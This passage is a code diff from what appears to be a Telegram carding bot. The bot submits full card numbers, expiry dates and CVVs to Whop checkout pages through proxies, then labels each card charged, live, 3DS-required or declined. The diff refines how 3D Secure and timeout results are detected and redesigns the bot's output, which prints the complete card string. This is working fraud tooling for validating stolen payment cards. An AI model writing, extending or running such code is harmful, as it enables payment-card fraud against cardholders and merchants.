         full_message = f"{err_msg} {str(confirm)} {pay_stat}".lower()
-        
+
+        # Check for 3DS first - this is a live card, not a failure!
+        if pay_stat == "requires_action" or status == "requires_action":
+            print(f"🔐 [WHOP] 3DS REQUIRED detected!")
+            out["status"] = "3DS_REQUIRED"
+            out["message"] = "3D Secure required - Authentication needed"
+            out["elapsed"] = round(time.time() - t0, 2)
+            return out
+
+        # Check for insufficient funds
         if "insufficient" in full_message or "funds" in full_message:
             print(f"💰 [WHOP] INSUFFICIENT FUNDS detected")
             out["status"] = "INSUFFICIENT_FUNDS"
@@ -58260,9 +58664,10 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
         if pay_stat == "succeeded":
             out["status"] = "CHARGED"
             out["message"] = "Payment successful"
-        elif status == "requires_action":
+        elif status == "completed" and pay_stat == "requires_action":
+            # This is 3DS - already handled above
             out["status"] = "3DS_REQUIRED"
-            out["message"] = "3DS authentication required"
+            out["message"] = "3D Secure required - Authentication needed"
         elif last_err and err_msg:
             err_lower = err_msg.lower()
             if "cvv" in err_lower or "security" in err_lower:
@@ -58278,8 +58683,19 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
             print("⏳ Polling for final status...")
             poll = await whop_poll_status(session_id, client_secret, cookie, proxy)
             out["steps"]["poll"] = poll
-            out["status"] = poll["final"]
-            out["message"] = poll.get("message", poll["final"])
+            
+            # ============ FIXED: Check poll result for 3DS ============
+            poll_status = poll.get("final", "")
+            poll_data = poll.get("data", {})
+            poll_payment = poll_data.get("payment", {})
+            poll_pay_stat = poll_payment.get("status", "")
+            
+            if poll_pay_stat == "requires_action":
+                out["status"] = "3DS_REQUIRED"
+                out["message"] = "3D Secure required - Authentication needed"
+            else:
+                out["status"] = poll_status
+                out["message"] = poll.get("message", poll_status)
         else:
             out["status"] = "UNKNOWN"
             out["message"] = f"status={status} pay={pay_stat}"
@@ -58295,9 +58711,12 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
 
 # ============ FORMAT WHOP RESPONSE WITH PREMIUM EMOJIS ============
 
+# ============ FIXED FORMAT_WHOP_RESPONSE - PROPERLY SHOWS 3DS ============
+
 def format_whop_response(result: Dict, bin_info: tuple, card: str) -> Tuple[str, str]:
     """
     Format Whop hit response with PREMIUM EMOJIS (like Shopify).
+    FIXED: Properly shows 3DS REQUIRED instead of TIMEOUT
     """
     status = result.get("status", "UNKNOWN")
     message = result.get("message", "Unknown")
@@ -58312,19 +58731,19 @@ def format_whop_response(result: Dict, bin_info: tuple, card: str) -> Tuple[str,
     
     full_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv}"
 
-    # Determine status with PREMIUM EMOJIS
+    # ============ DETERMINE STATUS WITH PREMIUM EMOJIS ============
     if status == "CHARGED":
         status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
         status_text = "Paid ✅"
         status_category = "charged"
     elif status == "INSUFFICIENT_FUNDS":
         status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
-        status_text = "Not Paid ❌"
+        status_text = "Insufficient Funds"
         status_category = "approved"
     elif status == "3DS_REQUIRED":
         status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
         status_text = "3DS Required"
-        status_category = "approved"
+        status_category = "approved"  # Card is live, just needs 3DS
     elif status == "CVV_LIVE":
         status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
         status_text = "CVV Live"
@@ -58333,6 +58752,16 @@ def format_whop_response(result: Dict, bin_info: tuple, card: str) -> Tuple[str,
         status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
         status_text = "Not Paid ❌"
         status_category = "declined"
+    elif status == "TIMEOUT":
+        # Check if it was actually 3DS from the message
+        if "3D" in message or "Secure" in message:
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+            status_text = "3DS Required"
+            status_category = "approved"
+        else:
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["warning"], "⚠️")
+            status_text = "Timeout"
+            status_category = "error"
     else:
         status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["warning"], "⚠️")
         status_text = "Unknown"
@@ -58346,15 +58775,23 @@ def format_whop_response(result: Dict, bin_info: tuple, card: str) -> Tuple[str,
         clean_message = "Your card has insufficient funds"
     elif "Payment successful" in message or "succeeded" in message.lower():
         clean_message = "Payment successful"
+    elif "3D" in message or "Secure" in message:
+        clean_message = "3D Secure Required - Authentication needed"
 
     # Build output with PREMIUM EMOJIS
     ui = (
-        f"Site ➳ Whop 🌐\n"
-        f"Amount ➳ {amount_display}\n"
-        f"Status ➳ {status_emoji} {status_text}\n"
-        f"Progress ➳ 1/1\n\n"
+        f"┏━━━━━━━⍟\n"
+        f"┃ {premium_emoji(PREMIUM_EMOJI_IDS['diamond'], '💳')} Whop Checkout Result\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"{premium_emoji(PREMIUM_EMOJI_IDS['globe'], '🌐')} Site ➳ Whop\n"
+        f"{premium_emoji(PREMIUM_EMOJI_IDS['money'], '💰')} Amount ➳ {amount_display}\n"
+        f"{premium_emoji(PREMIUM_EMOJI_IDS['target'], '🎯')} Status ➳ {status_emoji} {status_text}\n"
+        f"{premium_emoji(PREMIUM_EMOJI_IDS['stats'], '📊')} Progress ➳ 1/1\n\n"
         f"{full_card}\n"
-        f"  ⤷ {clean_message}"
+        f"  ⤷ {clean_message}\n"
+        f"\n"
+        f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '⏱️')} {datetime.now().strftime('%I:%M %p')}\n"
+        f"{premium_emoji(PREMIUM_EMOJI_IDS['skull'], '💀')} Bot ➛ @BLADESARKS_V3bot"
     )
 
     return ui, status_category
